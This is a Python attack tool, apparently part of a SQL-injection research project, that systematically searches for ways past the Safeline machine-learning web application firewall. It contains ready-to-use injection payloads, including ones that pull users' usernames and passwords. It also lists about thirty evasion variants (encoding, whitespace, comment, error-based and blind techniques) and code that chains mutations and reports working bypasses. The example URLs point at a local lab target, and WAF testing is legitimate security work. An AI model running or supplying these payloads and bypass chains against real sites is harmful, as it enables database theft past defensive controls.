"""
tools/probe_safeline.py
=======================
Systematic bypass probe for ML-based WAFs (Safeline CE).

Unlike probe_bypass.py which targets ModSec's rule patterns, this tool
probes which mutations are "transparent" to Safeline's semantic/ML detector,
then tests combinations to find bypass chains.

Three phases:
  Phase 1 — Single mutations: which ones does Safeline NOT catch?
  Phase 2 — Pairwise combinations of phase-1 survivors
  Phase 3 — Full bypass validation (WAF pass + SQL valid + markers confirm)

USAGE
-----
    # Full probe (all phases, one base payload)
    python3 -m tools.probe_safeline --url http://localhost:8888/Less-1/

    # Phase 1 only (fast scan, ~51 requests)
    python3 -m tools.probe_safeline --url http://localhost:8888/Less-1/ --phase 1

    # Phase 1 + 2 with custom base
    python3 -m tools.probe_safeline --url http://localhost:8888/Less-1/ --phase 2 \\
        --base "-1' UNION SELECT database(),'SEQSQLI_START','SEQSQLI_END'-- -"

    # Probe complex-tier base
    python3 -m tools.probe_safeline --url http://localhost:8888/Less-1/ --complex
"""

from __future__ import annotations

import argparse
import itertools
import time
from typing import List, Tuple

from seqsqli.core.mutations import MUTATIONS, ACTION_LIST
from seqsqli.core.http import send_request
from seqsqli.core.response import classify_response
from seqsqli.builder import build_target_from_args


# ---------------------------------------------------------------------------
# Base payloads
# ---------------------------------------------------------------------------

TRIVIAL_BASE = "-1' UNION SELECT database(),'SEQSQLI_START','SEQSQLI_END'-- -"

MEDIUM_BASE = (
    "-1' UNION SELECT (SELECT GROUP_CONCAT(table_name) FROM "
    "information_schema.tables WHERE table_schema=database()),"
    "'SEQSQLI_START','SEQSQLI_END'-- -"
)

COMPLEX_BASE = (
    "-1' UNION SELECT (SELECT GROUP_CONCAT(username,0x3a,password) "
    "FROM users),'SEQSQLI_START','SEQSQLI_END'-- -"
)

REQUEST_DELAY = 0.3   # Safeline has rate-limiting — be conservative


# ---------------------------------------------------------------------------
# Core probe helpers
# ---------------------------------------------------------------------------

def probe_single(target, payload: str, mutations: List[str]) -> Tuple[str, int, str]:
    """Apply mutations in order, return (result, http_status, final_payload)."""
    p = payload
    for m in mutations:
        p = MUTATIONS[m](p)
    resp, status = send_request(target, p)
    result = classify_response(resp, status, signal_type="union",
                               strict_markers=True)
    time.sleep(REQUEST_DELAY)
    return result, status, p


def is_blocked(result: str, status: int) -> bool:
    return status == 403 or result == "WAF_BLOCKED"


def is_success(result: str) -> bool:
    return result == "SUCCESS"


# ---------------------------------------------------------------------------
# Phase 1: single-mutation scan
# ---------------------------------------------------------------------------

def phase1(target, base: str) -> List[str]:
    """Test each mutation individually. Return list of 'transparent' mutations
    (ones that Safeline does NOT block — i.e. WAF passes the mutated payload,
    regardless of SQL validity)."""

    print("\n" + "=" * 68)
    print(" PHASE 1 — Single mutation scan")
    print(f" Base: {base[:80]}...")
    print("=" * 68)
    print(f"  {'Mutation':<20}  {'Status':>6}  {'WAF':>8}  {'Result'}")
    print("  " + "-" * 60)

    transparent = []
    success_direct = []

    for action in ACTION_LIST:
        mutated = MUTATIONS[action](base)
        if mutated == base:
            print(f"  {action:<20}  {'---':>6}  {'no-op':>8}")
            continue

        result, status, _ = probe_single(target, base, [action])

        waf = "PASS" if status != 403 else "BLOCK"
        marker = ""
        if is_success(result):
            marker = " ← BYPASS!"
            success_direct.append(action)
        elif not is_blocked(result, status):
            transparent.append(action)

        print(f"  {action:<20}  {status:>6}  {waf:>8}  {result}{marker}")

    print(f"\n  Transparent (WAF pass, no bypass yet): {transparent}")
    print(f"  Direct bypass:                          {success_direct}")
    return transparent + success_direct


# ---------------------------------------------------------------------------
# Phase 2: pairwise combinations of phase-1 survivors
# ---------------------------------------------------------------------------

def phase2(target, base: str, candidates: List[str],
           max_pairs: int = 200) -> List[Tuple[List[str], str]]:
    """Test ordered pairs from phase-1 candidates.
    Returns list of (mutation_chain, final_payload) for successful bypasses."""

    print("\n" + "=" * 68)
    print(" PHASE 2 — Pairwise combinations")
    print(f" Candidates: {candidates}")
    print("=" * 68)

    bypasses = []
    pairs = list(itertools.permutations(candidates, 2))
    if len(pairs) > max_pairs:
        pairs = pairs[:max_pairs]
        print(f"  (capped at {max_pairs} pairs)")

    print(f"  Testing {len(pairs)} ordered pairs...\n")

    for a, b in pairs:
        result, status, final_p = probe_single(target, base, [a, b])
        if is_success(result):
            print(f"  BYPASS: {a} → {b}")
            print(f"    payload: {final_p[:120]}")
            bypasses.append(([a, b], final_p))
        elif not is_blocked(result, status):
            print(f"  pass(no-bypass): {a} → {b}  [{result}]")

    return bypasses


# ---------------------------------------------------------------------------
# Phase 3: extend bypass chains (add one more mutation to survivors)
# ---------------------------------------------------------------------------

def phase3(target, base: str, phase2_survivors: List[Tuple[List[str], str]],
           extra_mutations: List[str]) -> List[Tuple[List[str], str]]:
    """Try extending phase-2 chains with one more mutation to improve SQL validity."""

    if not phase2_survivors:
        print("\n  (Phase 3 skipped — no phase-2 survivors)")
        return []

    print("\n" + "=" * 68)
    print(" PHASE 3 — Extend chains (+1 mutation)")
    print("=" * 68)

    extended = []
    for chain, _ in phase2_survivors:
        for extra in extra_mutations:
            if extra in chain:
                continue
            result, status, final_p = probe_single(target, base, chain + [extra])
            if is_success(result):
                full_chain = chain + [extra]
                print(f"  BYPASS: {' → '.join(full_chain)}")
                print(f"    payload: {final_p[:120]}")
                extended.append((full_chain, final_p))

    return extended


# ---------------------------------------------------------------------------
# Quick scan: test hand-crafted Safeline-specific bypass candidates
# ---------------------------------------------------------------------------

# Known techniques that sometimes fool ML-based WAFs:
# - e-notation: 1e0 as numeric literal
# - inline newline inside keyword: UN\nION
# - MySQL-specific: /*!50000UNION*/
# - Double URL encoding
# - Vertical tab / form-feed separators
# - ODBC escape sequences

SAFELINE_CANDIDATES = {
    # --- UNION SELECT variants (whitespace / comment tricks) ---
    "e-notation UNION":
        "-1' /*!50000UNION*/ /*!50000SELECT*/ database(),'SEQSQLI_START','SEQSQLI_END'-- -",
    "newline in keyword":
        "-1' UN\nION SE\nLECT database(),'SEQSQLI_START','SEQSQLI_END'-- -",
    "vtab separator":
        "-1'\x0bUNION\x0bSELECT\x0bdatabase(),'SEQSQLI_START','SEQSQLI_END'-- -",
    "formfeed separator":
        "-1'\x0cUNION\x0cSELECT\x0cdatabase(),'SEQSQLI_START','SEQSQLI_END'-- -",
    "case+vtab":
        "-1'\x0buNiOn\x0bsElEcT\x0bdaTaBase(),'SEQSQLI_START','SEQSQLI_END'-- -",
    "null_byte terminator+case":
        "-1' uNiOn sElEcT database(),'SEQSQLI_START','SEQSQLI_END';\x00",
    "double-encoded space":
        "-1'%2520UNION%2520SELECT%2520database(),'SEQSQLI_START','SEQSQLI_END'-- -",
    "MySQL conditional comment UNION":
        "-1'/*!UNION*//*!SELECT*/database(),'SEQSQLI_START','SEQSQLI_END'-- -",
    "hex-encoded separator":
        "-1'%09UNION%09SELECT%09database(),'SEQSQLI_START','SEQSQLI_END'-- -",
    "nbsp+case":
        "-1'%a0uNiOn%a0sElEcT%a0database%a0(),'SEQSQLI_START','SEQSQLI_END'-- -",
    "UNION ALL + case":
        "-1' uNiOn aLl sElEcT database(),'SEQSQLI_START','SEQSQLI_END'-- -",
    "scientific notation num":
        "-1e0' UNION SELECT database(),'SEQSQLI_START','SEQSQLI_END'-- -",

    # --- Error-based injection (completely different SQL structure) ---
    "extractvalue basic":
        "1 AND EXTRACTVALUE(1,CONCAT(0x7e,database()))-- -",
    "extractvalue case":
        "1 AND eXtRaCtVaLuE(1,CoNcAt(0x7e,DaTaBaSe()))-- -",
    "updatexml basic":
        "1 AND UPDATEXML(1,CONCAT(0x7e,database()),1)-- -",
    "updatexml case":
        "1 AND UpDaTeXmL(1,CoNcAt(0x7e,DaTaBaSe()),1)-- -",
    "extractvalue+comment":
        "1 AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT/**/database())))-- -",
    "floor rand error":
        "1 AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(database(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -",

    # --- Boolean-based blind (no data in response, detect via length diff) ---
    "boolean true":
        "1' AND 1=1-- -",
    "boolean false":
        "1' AND 1=2-- -",
    "boolean substr":
        "1' AND SUBSTRING(database(),1,1)='s'-- -",

    # --- Stacked queries ---
    "stacked sleep":
        "1'; SELECT SLEEP(0)-- -",

    # --- MySQL quirks ---
    "optimizer hint":
        "-1' UNION /*+ MAX_EXECUTION_TIME(1) */ SELECT database(),'SEQSQLI_START','SEQSQLI_END'-- -",
    "cr separator":
        "-1'\rUNION\rSELECT\rdatabase(),'SEQSQLI_START','SEQSQLI_END'-- -",
    "mixed cr+lf":
        "-1'\r\nUNION\r\nSELECT\r\ndatabase(),'SEQSQLI_START','SEQSQLI_END'-- -",
    "unicode whitespace":
        "-1'\xa0UNION\xa0SELECT\xa0database(),'SEQSQLI_START','SEQSQLI_END'-- -",

    # %a0 = URL-encoded single byte, latin1 0xA0 = non-breaking space = MySQL whitespace
    "nbsp kw sep":
        "-1'%a0UNION%a0SELECT%a0database(),'SEQSQLI_START','SEQSQLI_END'-- -",
    "nbsp kw sep+case":
        "-1'%a0uNiOn%a0sElEcT%a0dAtAbAsE(),'SEQSQLI_START','SEQSQLI_END'-- -",
    "nbsp+null_byte":
        "-1'%a0UNION%a0SELECT%a0database(),'SEQSQLI_START','SEQSQLI_END';%00",
    "nbsp+null_byte+case":
        "-1'%a0uNiOn%a0sElEcT%a0dAtAbAsE(),'SEQSQLI_START','SEQSQLI_END';%00",
}


def classify_any(resp_text: str, status: int) -> str:
    """Classify response trying both union and error-based criteria."""
    # Try union (strict markers)
    r = classify_response(resp_text, status, signal_type="union",
                          strict_markers=True)
    if r == "SUCCESS":
        return "SUCCESS(union)"
    # Try error-based (all known error functions)
    for fn in ["extractvalue", "updatexml", "floor", "exp", "gtid_subset"]:
        r2 = classify_response(resp_text, status,
                               signal_type="error", error_function=fn)
        if r2 == "SUCCESS":
            return f"SUCCESS(error:{fn})"
    # Check boolean blind: just report length as hint
    return r


def quick_scan(target):
    """Test hand-crafted Safeline bypass candidates directly."""
    print("\n" + "=" * 68)
    print(" QUICK SCAN — Hand-crafted Safeline bypass candidates")
    print("=" * 68)

    results = []
    for label, payload in SAFELINE_CANDIDATES.items():
        resp, status = send_request(target, payload)
        result = classify_any(resp, status)
        waf = "PASS" if status != 403 else "BLOCK"
        marker = " ← BYPASS!" if result.startswith("SUCCESS") else ""
        print(f"  [{waf}] {label:<40} → {result}{marker}")
        if result.startswith("SUCCESS"):
            results.append((label, payload))
        time.sleep(REQUEST_DELAY)

    return results


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main():
    ap = argparse.ArgumentParser(
        description="Systematic Safeline bypass probe — phases 1/2/3 + quick scan."
    )
    ap.add_argument("--url", required=True, help="Target URL (Safeline port)")
    ap.add_argument("--param", default="id")
    ap.add_argument("--method", default="GET", choices=["GET", "POST"])
    ap.add_argument("--phase", type=int, default=3,
                    help="Run up to this phase (1/2/3). Default: 3")
    ap.add_argument("--base", default=TRIVIAL_BASE,
                    help="Base payload to probe")
    ap.add_argument("--complex", action="store_true",
                    help="Use complex-tier base (GROUP_CONCAT + FROM users)")
    ap.add_argument("--medium", action="store_true",
                    help="Use medium-tier base (GROUP_CONCAT + information_schema)")
    ap.add_argument("--quick", action="store_true",
                    help="Only run quick scan (hand-crafted candidates)")
    ap.add_argument("--delay", type=float, default=REQUEST_DELAY,
                    help=f"Delay between requests (default {REQUEST_DELAY}s)")
    args = ap.parse_args()

    import tools.probe_safeline as _self
    _self.REQUEST_DELAY = args.delay

    target = build_target_from_args(args.url, args.param, args.method, None)

    base = args.base
    if args.complex:
        base = COMPLEX_BASE
    elif args.medium:
        base = MEDIUM_BASE

    # Always run quick scan first
    print(f"\nTarget: {args.url}")
    print(f"Base:   {base[:100]}")
    quick_bypasses = quick_scan(target)

    if args.quick:
        if quick_bypasses:
            print(f"\n[+] {len(quick_bypasses)} quick bypass(es) found:")
            for label, p in quick_bypasses:
                print(f"    {label}")
        else:
            print("\n[-] No quick bypasses found.")
        return

    # Phase 1
    if args.phase >= 1:
        candidates = phase1(target, base)

    # Phase 2
    bypasses2 = []
    if args.phase >= 2 and candidates:
        bypasses2 = phase2(target, base, candidates)

    # Phase 3
    bypasses3 = []
    if args.phase >= 3 and bypasses2:
        bypasses3 = phase3(target, base, bypasses2, ACTION_LIST)

    # Summary
    all_bypasses = (
        [(["(quick) " + l], p) for l, p in quick_bypasses]
        + bypasses2
        + bypasses3
    )

    print("\n" + "=" * 68)
    print(" SUMMARY")
    print("=" * 68)
    if all_bypasses:
        print(f"\n[+] {len(all_bypasses)} bypass chain(s) found:\n")
        for chain, payload in all_bypasses:
            print(f"  Chain : {' → '.join(chain)}")
            print(f"  Payload: {payload[:120]}")
            print()
    else:
        print("\n[-] No bypasses found in this run.")
        print("    Suggestions:")
        print("    - Try --complex or --medium for harder tiers")
        print("    - Adjust --delay if rate-limited")
        print("    - Add new candidates to SAFELINE_CANDIDATES dict")


if __name__ == "__main__":
    main()
